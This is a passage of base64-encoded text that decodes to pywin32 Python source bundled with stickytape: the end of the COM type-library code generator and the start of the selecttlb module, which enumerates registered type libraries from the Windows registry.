CAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAgICAgIlxcdCVzOiAlcywiICUgKHJlcHIocmVjb3JkLmRvY1swXSksIHJlcHIoc3RyKHJlY29yZC5jbHNpZCkpKSxcbiAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICBwcmludCgifSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludChmaWxlPXN0cmVhbSlcblxuICAgICAgICAjIFdyaXRlIG91dCBfYWxsXyBteSBnZW5lcmF0ZWQgQ0xTSURcJ3MgaW4gdGhlIG1hcFxuICAgICAgICBpZiBzZWxmLmdlbmVyYXRlX3R5cGUgPT0gR0VOX0ZVTEw6XG4gICAgICAgICAgICBwcmludCgiQ0xTSURUb0NsYXNzTWFwID0geyIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgZm9yIGl0ZW0gaW4gb2xlSXRlbXMudmFsdWVzKCk6XG4gICAgICAgICAgICAgICAgaWYgaXRlbSBpcyBub3QgTm9uZSBhbmQgaXRlbS5iV3JpdHRlbjpcbiAgICAgICAgICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgICAgICAgICAiXFx0XCclc1wnIDogJXMsIiAlIChzdHIoaXRlbS5jbHNpZCksIGl0ZW0ucHl0aG9uX25hbWUpLFxuICAgICAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgIHByaW50KCJ9IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludCgiQ0xTSURUb1BhY2thZ2VNYXAgPSB7fSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgIndpbjMyY29tLmNsaWVudC5DTFNJRFRvQ2xhc3MuUmVnaXN0ZXJDTFNJRHNGcm9tRGljdCggQ0xTSURUb0NsYXNzTWFwICkiLFxuICAgICAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgcHJpbnQoIlZUYWJsZXNUb1BhY2thZ2VNYXAgPSB7fSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoIlZUYWJsZXNUb0NsYXNzTWFwID0geyIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgZm9yIGl0ZW0gaW4gdnRhYmxlSXRlbXMudmFsdWVzKCk6XG4gICAgICAgICAgICAgICAgcHJpbnQoIlxcdFwnJXNcJyA6IFwnJXNcJywiICUgKGl0ZW0uY2xzaWQsIGl0ZW0ucHl0aG9uX25hbWUpLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgIHByaW50KCJ9IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludChmaWxlPXN0cmVhbSlcblxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgcHJpbnQoIkNMU0lEVG9DbGFzc01hcCA9IHt9IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludCgiQ0xTSURUb1BhY2thZ2VNYXAgPSB7IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBmb3IgaXRlbSBpbiBvbGVJdGVtcy52YWx1ZXMoKTpcbiAgICAgICAgICAgICAgICBpZiBpdGVtIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAgICAgICAgICJcXHRcJyVzXCcgOiAlcywiICUgKHN0cihpdGVtLmNsc2lkKSwgcmVwcihpdGVtLnB5dGhvbl9uYW1lKSksXG4gICAgICAgICAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgcHJpbnQoIn0iLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgIHByaW50KCJWVGFibGVzVG9DbGFzc01hcCA9IHt9IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludCgiVlRhYmxlc1RvUGFja2FnZU1hcCA9IHsiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgIGZvciBpdGVtIGluIHZ0YWJsZUl0ZW1zLnZhbHVlcygpOlxuICAgICAgICAgICAgICAgIHByaW50KCJcXHRcJyVzXCcgOiBcJyVzXCcsIiAlIChpdGVtLmNsc2lkLCBpdGVtLnB5dGhvbl9uYW1lKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludCgifSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoZmlsZT1zdHJlYW0pXG5cbiAgICAgICAgcHJpbnQoZmlsZT1zdHJlYW0pXG4gICAgICAgICMgQml0IG9mIGEgaGFjayAtIGJ1aWxkIGEgdGVtcCBtYXAgb2YgaXRlSXRlbXMgKyB2dGFibGVJdGVtcyAtIGNvQ2xhc3Nlc1xuICAgICAgICBtYXAgPSB7fVxuICAgICAgICBmb3IgaXRlbSBpbiBvbGVJdGVtcy52YWx1ZXMoKTpcbiAgICAgICAgICAgIGlmIGl0ZW0gaXMgbm90IE5vbmUgYW5kIG5vdCBpc2luc3RhbmNlKGl0ZW0sIENvQ2xhc3NJdGVtKTpcbiAgICAgICAgICAgICAgICBtYXBbaXRlbS5weXRob25fbmFtZV0gPSBpdGVtLmNsc2lkXG4gICAgICAgIGZvciBpdGVtIGluIHZ0YWJsZUl0ZW1zLnZhbHVlcygpOiAgIyBObyBub25lcyBvciBDb0NsYXNzZXMgaW4gdGhpcyBtYXBcbiAgICAgICAgICAgIG1hcFtpdGVtLnB5dGhvbl9uYW1lXSA9IGl0ZW0uY2xzaWRcblxuICAgICAgICBwcmludCgiTmFtZXNUb0lJRE1hcCA9IHsiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgZm9yIG5hbWUsIGlpZCBpbiBtYXAuaXRlbXMoKTpcbiAgICAgICAgICAgIHByaW50KCJcXHRcJyVzXCcgOiBcJyVzXCcsIiAlIChuYW1lLCBpaWQpLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIn0iLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoZmlsZT1zdHJlYW0pXG5cbiAgICAgICAgaWYgZW51bUl0ZW1zOlxuICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgIndpbjMyY29tLmNsaWVudC5jb25zdGFudHMuX19kaWN0c19fLmFwcGVuZChjb25zdGFudHMuX19kaWN0X18pIixcbiAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgIClcbiAgICAgICAgcHJpbnQoZmlsZT1zdHJlYW0pXG5cbiAgICBkZWYgZ2VuZXJhdGVfY2hpbGQoc2VsZiwgY2hpbGQsIGRpcik6XG4gICAgICAgICJHZW5lcmF0ZSBhIHNpbmdsZSBjaGlsZC4gIE1heSBmb3JjZSBhIGZldyBjaGlsZHJlbiB0byBiZSBidWlsdCBhcyB3ZSBnZW5lcmF0ZSBkZXBzIlxuICAgICAgICBzZWxmLmdlbmVyYXRlX3R5cGUgPSBHRU5fREVNQU5EX0NISUxEXG5cbiAgICAgICAgbGEgPSBzZWxmLnR5cGVsaWIuR2V0TGliQXR0cigpXG4gICAgICAgIGxjaWQgPSBsYVsxXVxuICAgICAgICBjbHNpZCA9IGxhWzBdXG4gICAgICAgIG1ham9yID0gbGFbM11cbiAgICAgICAgbWlub3IgPSBsYVs0XVxuICAgICAgICBzZWxmLmJhc2VfbW9kX25hbWUgPSAoXG4gICAgICAgICAgICAid2luMzJjb20uZ2VuX3B5LiIgKyBzdHIoY2xzaWQpWzE6LTFdICsgInglc3glc3glcyIgJSAobGNpZCwgbWFqb3IsIG1pbm9yKVxuICAgICAgICApXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgICMgUHJvY2VzcyB0aGUgdHlwZSBsaWJyYXJ5XCdzIENvQ2xhc3Mgb2JqZWN0cywgbG9va2luZyBmb3IgdGhlXG4gICAgICAgICAgICAjIHNwZWNpZmllZCBuYW1lLCBvciB3aGVyZSBhIGNoaWxkIGhhcyB0aGUgc3BlY2lmaWVkIG5hbWUuXG4gICAgICAgICAgICAjIFRoaXMgZW5zdXJlcyB0aGF0IGFsbCBpbnRlcmVzdGluZyB0aGluZ3MgKGluY2x1ZGluZyBldmVudCBpbnRlcmZhY2VzKVxuICAgICAgICAgICAgIyBhcmUgZ2VuZXJhdGVkIGNvcnJlY3RseS5cbiAgICAgICAgICAgIG9sZUl0ZW1zID0ge31cbiAgICAgICAgICAgIHZ0YWJsZUl0ZW1zID0ge31cbiAgICAgICAgICAgIGluZm9zID0gc2VsZi5Db2xsZWN0T2xlSXRlbUluZm9zRnJvbVR5cGUoKVxuICAgICAgICAgICAgZm91bmQgPSAwXG4gICAgICAgICAgICBmb3IgdHlwZV9pbmZvX3R1cGxlIGluIGluZm9zOlxuICAgICAgICAgICAgICAgIGluZm8sIGluZm90eXBlLCBkb2MsIGF0dHIgPSB0eXBlX2luZm9fdHVwbGVcbiAgICAgICAgICAgICAgICBpZiBpbmZvdHlwZSA9PSBweXRob25jb20uVEtJTkRfQ09DTEFTUzpcbiAgICAgICAgICAgICAgICAgICAgY29DbGFzc0l0ZW0sIGNoaWxkX2luZm9zID0gc2VsZi5fQnVpbGRfQ29DbGFzcyh0eXBlX2luZm9fdHVwbGUpXG4gICAgICAgICAgICAgICAgICAgIGZvdW5kID0gYnVpbGQuTWFrZVB1YmxpY0F0dHJpYnV0ZU5hbWUoZG9jWzBdKSA9PSBjaGlsZFxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgZm91bmQ6XG4gICAgICAgICAgICAgICAgICAgICAgICAjIE9LLCBjaGVjayB0aGUgY2hpbGQgaW50ZXJmYWNlc1xuICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm9fdHlwZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZUeXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvYyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZBdHRyLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzLFxuICAgICAgICAgICAgICAgICAgICAgICAgKSBpbiBjaGlsZF9pbmZvczpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBidWlsZC5NYWtlUHVibGljQXR0cmlidXRlTmFtZShkb2NbMF0pID09IGNoaWxkOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3VuZCA9IDFcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcbiAgICAgICAgICAgICAgICAgICAgaWYgZm91bmQ6XG4gICAgICAgICAgICAgICAgICAgICAgICBvbGVJdGVtc1tjb0NsYXNzSXRlbS5jbHNpZF0gPSBjb0NsYXNzSXRlbVxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fQnVpbGRfQ29DbGFzc0NoaWxkcmVuKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvQ2xhc3NJdGVtLCBjaGlsZF9pbmZvcywgb2xlSXRlbXMsIHZ0YWJsZUl0ZW1zXG4gICAgICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVha1xuICAgICAgICAgICAgaWYgbm90IGZvdW5kOlxuICAgICAgICAgICAgICAgICMgRG9lc25cJ3QgYXBwZWFyIGluIGEgY2xhc3MgZGVmbiAtIGxvb2sgaW4gdGhlIGludGVyZmFjZSBvYmplY3RzIGZvciBpdFxuICAgICAgICAgICAgICAgIGZvciB0eXBlX2luZm9fdHVwbGUgaW4gaW5mb3M6XG4gICAgICAgICAgICAgICAgICAgIGluZm8sIGluZm90eXBlLCBkb2MsIGF0dHIgPSB0eXBlX2luZm9fdHVwbGVcbiAgICAgICAgICAgICAgICAgICAgaWYgaW5mb3R5cGUgaW4gW1xuICAgICAgICAgICAgICAgICAgICAgICAgcHl0aG9uY29tLlRLSU5EX0lOVEVSRkFDRSxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB5dGhvbmNvbS5US0lORF9ESVNQQVRDSCxcbiAgICAgICAgICAgICAgICAgICAgXTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJ1aWxkLk1ha2VQdWJsaWNBdHRyaWJ1dGVOYW1lKGRvY1swXSkgPT0gY2hpbGQ6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZm91bmQgPSAxXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgb2xlSXRlbSwgdnRhYmxlSXRlbSA9IHNlbGYuX0J1aWxkX0ludGVyZmFjZSh0eXBlX2luZm9fdHVwbGUpXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgb2xlSXRlbXNbY2xzaWRdID0gb2xlSXRlbSAgIyBFdmVuICJOb25lIiBnb2VzIGluIGhlcmUuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdnRhYmxlSXRlbSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdnRhYmxlSXRlbXNbY2xzaWRdID0gdnRhYmxlSXRlbVxuXG4gICAgICAgICAgICBhc3NlcnQgKFxuICAgICAgICAgICAgICAgIGZvdW5kXG4gICAgICAgICAgICApLCAiQ2FudCBmaW5kIHRoZSBcJyVzXCcgaW50ZXJmYWNlIGluIHRoZSBDb0NsYXNzZXMsIG9yIHRoZSBpbnRlcmZhY2VzIiAlIChcbiAgICAgICAgICAgICAgICBjaGlsZCxcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgICMgTWFrZSBhIG1hcCBvZiBpaWQ6IGRpc3BpdGVtLCB2dGFibGVpdGVtKVxuICAgICAgICAgICAgaXRlbXMgPSB7fVxuICAgICAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gb2xlSXRlbXMuaXRlbXMoKTpcbiAgICAgICAgICAgICAgICBpdGVtc1trZXldID0gKHZhbHVlLCBOb25lKVxuICAgICAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gdnRhYmxlSXRlbXMuaXRlbXMoKTpcbiAgICAgICAgICAgICAgICBleGlzdGluZyA9IGl0ZW1zLmdldChrZXksIE5vbmUpXG4gICAgICAgICAgICAgICAgaWYgZXhpc3RpbmcgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgICAgIG5ld192YWwgPSBleGlzdGluZ1swXSwgdmFsdWVcbiAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICBuZXdfdmFsID0gTm9uZSwgdmFsdWVcbiAgICAgICAgICAgICAgICBpdGVtc1trZXldID0gbmV3X3ZhbFxuXG4gICAgICAgICAgICBzZWxmLnByb2dyZXNzLlNldERlc2NyaXB0aW9uKCJHZW5lcmF0aW5nLi4uIiwgbGVuKGl0ZW1zKSlcbiAgICAgICAgICAgIGZvciBvbGVpdGVtLCB2dGFibGVpdGVtIGluIGl0ZW1zLnZhbHVlcygpOlxuICAgICAgICAgICAgICAgIGFuX2l0ZW0gPSBvbGVpdGVtIG9yIHZ0YWJsZWl0ZW1cbiAgICAgICAgICAgICAgICBhc3NlcnQgbm90IHNlbGYuZmlsZSwgImFscmVhZHkgaGF2ZSBhIGZpbGU/IlxuICAgICAgICAgICAgICAgICMgbGlrZSBtYWtlcHkucHksIHdlIGdlbiB0byBhIC50ZW1wIGZpbGUgc28gZmFpbHVyZSBkb2VzblwndFxuICAgICAgICAgICAgICAgICMgbGVhdmUgYSAxLzIgZ2VuZXJhdGVkIG1lc3MuXG4gICAgICAgICAgICAgICAgb3V0X25hbWUgPSBvcy5wYXRoLmpvaW4oZGlyLCBhbl9pdGVtLnB5dGhvbl9uYW1lKSArICIucHkiXG4gICAgICAgICAgICAgICAgd29ya2VkID0gRmFsc2VcbiAgICAgICAgICAgICAgICBzZWxmLmZpbGUgPSBzZWxmLm9wZW5fd3JpdGVyKG91dF9uYW1lKVxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgaWYgb2xlaXRlbSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZG9fZ2VuX2NoaWxkX2l0ZW0ob2xlaXRlbSlcbiAgICAgICAgICAgICAgICAgICAgaWYgdnRhYmxlaXRlbSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZG9fZ2VuX2NoaWxkX2l0ZW0odnRhYmxlaXRlbSlcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5wcm9ncmVzcy5UaWNrKClcbiAgICAgICAgICAgICAgICAgICAgd29ya2VkID0gVHJ1ZVxuICAgICAgICAgICAgICAgIGZpbmFsbHk6XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZmluaXNoX3dyaXRlcihvdXRfbmFtZSwgc2VsZi5maWxlLCB3b3JrZWQpXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZmlsZSA9IE5vbmVcbiAgICAgICAgZmluYWxseTpcbiAgICAgICAgICAgIHNlbGYucHJvZ3Jlc3MuRmluaXNoZWQoKVxuXG4gICAgZGVmIGRvX2dlbl9jaGlsZF9pdGVtKHNlbGYsIG9sZWl0ZW0pOlxuICAgICAgICBtb2R1bGVEb2MgPSBzZWxmLnR5cGVsaWIuR2V0RG9jdW1lbnRhdGlvbigtMSlcbiAgICAgICAgZG9jRGVzYyA9ICIiXG4gICAgICAgIGlmIG1vZHVsZURvY1sxXTpcbiAgICAgICAgICAgIGRvY0Rlc2MgPSBtb2R1bGVEb2NbMV1cbiAgICAgICAgc2VsZi5wcm9ncmVzcy5TdGFydGluZyhkb2NEZXNjKVxuICAgICAgICBzZWxmLnByb2dyZXNzLlNldERlc2NyaXB0aW9uKCJCdWlsZGluZyBkZWZpbml0aW9ucyBmcm9tIHR5cGUgbGlicmFyeS4uLiIpXG4gICAgICAgIHNlbGYuZG9fZ2VuX2ZpbGVfaGVhZGVyKClcbiAgICAgICAgb2xlaXRlbS5Xcml0ZUNsYXNzKHNlbGYpXG4gICAgICAgIGlmIG9sZWl0ZW0uYldyaXR0ZW46XG4gICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICBcJ3dpbjMyY29tLmNsaWVudC5DTFNJRFRvQ2xhc3MuUmVnaXN0ZXJDTFNJRCggIiVzIiwgJXMgKVwnXG4gICAgICAgICAgICAgICAgJSAob2xlaXRlbS5jbHNpZCwgb2xlaXRlbS5weXRob25fbmFtZSksXG4gICAgICAgICAgICAgICAgZmlsZT1zZWxmLmZpbGUsXG4gICAgICAgICAgICApXG5cbiAgICBkZWYgY2hlY2tXcml0ZURpc3BhdGNoQmFzZUNsYXNzKHNlbGYpOlxuICAgICAgICBpZiBub3Qgc2VsZi5iSGF2ZVdyaXR0ZW5EaXNwYXRjaEJhc2VDbGFzczpcbiAgICAgICAgICAgIHByaW50KCJmcm9tIHdpbjMyY29tLmNsaWVudCBpbXBvcnQgRGlzcGF0Y2hCYXNlQ2xhc3MiLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgICAgIHNlbGYuYkhhdmVXcml0dGVuRGlzcGF0Y2hCYXNlQ2xhc3MgPSAxXG5cbiAgICBkZWYgY2hlY2tXcml0ZUNvQ2xhc3NCYXNlQ2xhc3Moc2VsZik6XG4gICAgICAgIGlmIG5vdCBzZWxmLmJIYXZlV3JpdHRlbkNvQ2xhc3NCYXNlQ2xhc3M6XG4gICAgICAgICAgICBwcmludCgiZnJvbSB3aW4zMmNvbS5jbGllbnQgaW1wb3J0IENvQ2xhc3NCYXNlQ2xhc3MiLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgICAgIHNlbGYuYkhhdmVXcml0dGVuQ29DbGFzc0Jhc2VDbGFzcyA9IDFcblxuICAgIGRlZiBjaGVja1dyaXRlRXZlbnRCYXNlQ2xhc3Moc2VsZik6XG4gICAgICAgICMgTm90IGEgYmFzZSBjbGFzcyBhcyBzdWNoLi4uXG4gICAgICAgIGlmIG5vdCBzZWxmLmJIYXZlV3JpdHRlbkV2ZW50QmFzZUNsYXNzOlxuICAgICAgICAgICAgIyBOb3RoaW5nIHRvIGRvIGFueSBtb3JlIVxuICAgICAgICAgICAgc2VsZi5iSGF2ZVdyaXR0ZW5FdmVudEJhc2VDbGFzcyA9IDFcblxuXG5pZiBfX25hbWVfXyA9PSAiX19tYWluX18iOlxuICAgIHByaW50KCJUaGlzIGlzIGEgd29ya2VyIG1vZHVsZS4gIFBsZWFzZSB1c2UgbWFrZXB5IHRvIGdlbmVyYXRlIFB5dGhvbiBmaWxlcy4iKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3dpbjMyY29tL2NsaWVudC9zZWxlY3R0bGIucHknLCBiJyIiIlV0aWxpdGllcyBmb3Igc2VsZWN0aW5nIGFuZCBlbnVtZXJhdGluZyB0aGUgVHlwZSBMaWJyYXJpZXMgaW5zdGFsbGVkIG9uIHRoZSBzeXN0ZW1cbiIiIlxuXG5pbXBvcnQgd2luMzJhcGksIHdpbjMyY29uLCBweXRob25jb21cblxuXG5jbGFzcyBUeXBlbGliU3BlYzpcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY2xzaWQsIGxjaWQsIG1ham9yLCBtaW5vciwgZmxhZ3M9MCk6XG4gICAgICAgIHNlbGYuY2xzaWQgPSBzdHIoY2xzaWQpXG4gICAgICAgIHNlbGYubGNpZCA9IGludChsY2lkKVxuICAgICAgICAjIFdlIGF2b2lkIGFzc3VtaW5nIFwnbWFqb3JcJyBvciBcJ21pbm9yXCcgYXJlIGludGVnZXJzIC0gd2hlblxuICAgICAgICAjIHJlYWQgZnJvbSB0aGUgcmVnaXN0cnkgdGhlcmUgaXMgc29tZSBjb25mdXNpb24gYWJvdXQgaWZcbiAgICAgICAgIyB0aGV5IGFyZSBiYXNlIDEwIG9yIGJhc2UgMTYgKHRoZXkgKnNob3VsZCogYmUgYmFzZSAxNiwgYnV0XG4gICAgICAgICMgaG93IHRoZXkgYXJlIHdyaXR0ZW4gaXMgYmV5b25kIG91ciBjb250cm9sLilcbiAgICAgICAgc2VsZi5tYWpvciA9IG1ham9yXG4gICAgICAgIHNlbGYubWlub3IgPSBtaW5vclxuICAgICAgICBzZWxmLmRsbCA9IE5vbmVcbiAgICAgICAgc2VsZi5kZXNjID0gTm9uZVxuICAgICAgICBzZWxmLnZlcl9kZXNjID0gTm9uZVxuICAgICAgICBzZWxmLmZsYWdzID0gZmxhZ3NcblxuICAgICMgRm9yIHRoZSBTZWxlY3RMaXN0XG4gICAgZGVmIF9fZ2V0aXRlbV9fKHNlbGYsIGl0ZW0pOlxuICAgICAgICBpZiBpdGVtID09IDA6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi52ZXJfZGVzY1xuICAgICAgICByYWlzZSBJbmRleEVycm9yKCJDYW50IGluZGV4IG1lISIpXG5cbiAgICBkZWYgX19sdF9fKHNlbGYsIG90aGVyKTogICMgcmljaC1jbXAvcHkzay1mcmllbmRseSB2ZXJzaW9uXG4gICAgICAgIG1lID0gKFxuICAgICAgICAgICAgKHNlbGYudmVyX2Rlc2Mgb3IgIiIpLmxvd2VyKCksXG4gICAgICAgICAgICAoc2VsZi5kZXNjIG9yICIiKS5sb3dlcigpLFxuICAgICAgICAgICAgc2VsZi5tYWpvcixcbiAgICAgICAgICAgIHNlbGYubWlub3IsXG4gICAgICAgIClcbiAgICAgICAgdGhlbSA9IChcbiAgICAgICAgICAgIChvdGhlci52ZXJfZGVzYyBvciAiIikubG93ZXIoKSxcbiAgICAgICAgICAgIChvdGhlci5kZXNjIG9yICIiKS5sb3dlcigpLFxuICAgICAgICAgICAgb3RoZXIubWFqb3IsXG4gICAgICAgICAgICBvdGhlci5taW5vcixcbiAgICAgICAgKVxuICAgICAgICByZXR1cm4gbWUgPCB0aGVtXG5cbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyKTogICMgcmljaC1jbXAvcHkzay1mcmllbmRseSB2ZXJzaW9uXG4gICAgICAgIHJldHVybiAoXG4gICAgICAgICAgICAoc2VsZi52ZXJfZGVzYyBvciAiIikubG93ZXIoKSA9PSAob3RoZXIudmVyX2Rlc2Mgb3IgIiIpLmxvd2VyKClcbiAgICAgICAgICAgIGFuZCAoc2VsZi5kZXNjIG9yICIiKS5sb3dlcigpID09IChvdGhlci5kZXNjIG9yICIiKS5sb3dlcigpXG4gICAgICAgICAgICBhbmQgc2VsZi5tYWpvciA9PSBvdGhlci5tYWpvclxuICAgICAgICAgICAgYW5kIHNlbGYubWlub3IgPT0gb3RoZXIubWlub3JcbiAgICAgICAgKVxuXG4gICAgZGVmIFJlc29sdmUoc2VsZik6XG4gICAgICAgIGlmIHNlbGYuZGxsIGlzIE5vbmU6XG4gICAgICAgICAgICByZXR1cm4gMFxuICAgICAgICB0bGIgPSBweXRob25jb20uTG9hZFR5cGVMaWIoc2VsZi5kbGwpXG4gICAgICAgIHNlbGYuRnJvbVR5cGVsaWIodGxiLCBOb25lKVxuICAgICAgICByZXR1cm4gMVxuXG4gICAgZGVmIEZyb21UeXBlbGliKHNlbGYsIHR5cGVsaWIsIGRsbE5hbWU9Tm9uZSk6XG4gICAgICAgIGxhID0gdHlwZWxpYi5HZXRMaWJBdHRyKClcbiAgICAgICAgc2VsZi5jbHNpZCA9IHN0cihsYVswXSlcbiAgICAgICAgc2VsZi5sY2lkID0gbGFbMV1cbiAgICAgICAgc2VsZi5tYWpvciA9IGxhWzNdXG4gICAgICAgIHNlbGYubWlub3IgPSBsYVs0XVxuICAgICAgICBpZiBkbGxOYW1lOlxuICAgICAgICAgICAgc2VsZi5kbGwgPSBkbGxOYW1lXG5cblxuZGVmIEVudW1LZXlzKHJvb3QpOlxuICAgIGluZGV4ID0gMFxuICAgIHJldCA9IFtdXG4gICAgd2hpbGUgMTpcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgaXRlbSA9IHdpbjMyYXBpLlJlZ0VudW1LZXkocm9vdCwgaW5kZXgpXG4gICAgICAgIGV4Y2VwdCB3aW4zMmFwaS5lcnJvcjpcbiAgICAgICAgICAgIGJyZWFrXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgICMgTm90ZSB0aGlzIGRvZXNuXCd0IGhhbmRsZSBSRUdfRVhQQU5EX1NaLCBidXQgdGhlIGltcGxlbWVudGF0aW9uXG4gICAgICAgICAgICAjIGhlcmUgZG9lc25cJ3QgbmVlZCB0byAtIHRoYXQgaXMgaGFuZGxlZCBhcyB0aGUgZGF0YSBpcyByZWFkLlxuICAgICAgICAgICAgdmFsID0gd2luMzJhcGkuUmVnUXVlcnlWYWx1ZShyb290LCBpdGVtKVxuICAgICAgICBleGNlcHQgd2luMzJhcGkuZXJyb3I6XG4gICAgICAgICAgICB2YWwgPSAiIiAgIyBjb2RlIHVzaW5nIHRoaXMgYXNzdW1lcyBhIHN0cmluZy5cblxuICAgICAgICByZXQuYXBwZW5kKChpdGVtLCB2YWwpKVxuICAgICAgICBpbmRleCA9IGluZGV4ICsgMVxuICAgIHJldHVybiByZXRcblxuXG5GTEFHX1JFU1RSSUNURUQgPSAxXG5GTEFHX0NPTlRST0wgPSAyXG5GTEFHX0hJRERFTiA9IDRcblxuXG5kZWYgRW51bVRsYnMoZXhjbHVkZUZsYWdzPTApOlxuICAgICIiIlJldHVybiBhIGxpc3Qgb2YgVHlwZWxpYlNwZWMgb2JqZWN0cywgb25lIGZvciBlYWNoIHJlZ2lzdGVyZWQgbGlicmFyeS4iIiJcbiAgICBrZXkgPSB3aW4zMmFwaS5SZWdPcGVuS2V5KHdpbjMyY29uLkhLRVlfQ0xBU1NFU19ST09ULCAiVHlwZWxpYiIpXG4gICAgaWlkcyA9IEVudW1LZXlzKGtleSlcbiAgICByZXN1bHRzID0gW11cbiAgICBmb3IgaWlkLCBjcmFwIGluIGlpZHM6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGtleTIgPSB3aW4zMmFwaS5SZWdPcGVuS2V5KGtleSwgc3RyKGlpZCkpXG4gICAgICAgIGV4Y2VwdCB3aW4zMmFwaS5lcnJvcjpcbiAgICAgICAgICAgICMgQSBmZXcgZ29vZCByZWFzb25zIGZvciB0aGlzLCBpbmNsdWRpbmcgImFjY2VzcyBkZW5pZWQiLlxuICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgZm9yIHZlcnNpb24sIHRsYmRlc2MgaW4gRW51bUtleXMoa2V5Mik6XG4gICAgICAgICAgICBtYWpvcl9taW5vciA9IHZlcnNpb24uc3BsaXQoIi4iLCAxKVxuICAgICAgICAgICAgaWYgbGVuKG1ham9yX21pbm9yKSA8IDI6XG4gICAgICAgICAgICAgICAgbWFqb3JfbWlub3IuYXBwZW5kKCIwIilcbiAgICAgICAgICAgICMgRm9yIHNvbWUgcmVhc29uLCB0aGlzIGNvZGUgdXNlZCB0byBhc3N1bWUgdGhlIHZhbHVlcyB3ZXJlIGhleC5cbiAgICAgICAgICAgICMgVGhpcyBzZWVtcyB0byBub3QgYmUgdHJ1ZSAtIHBhcnRpY3VsYXJseSBmb3IgQ0RPIDEuMjFcbiAgICAgICAgICAgICMgKnNpZ2gqIC0gaXQgYXBwZWFycyB0aGVyZSBhcmUgbm8gcnVsZXMgaGVyZSBhdCBhbGwsIHN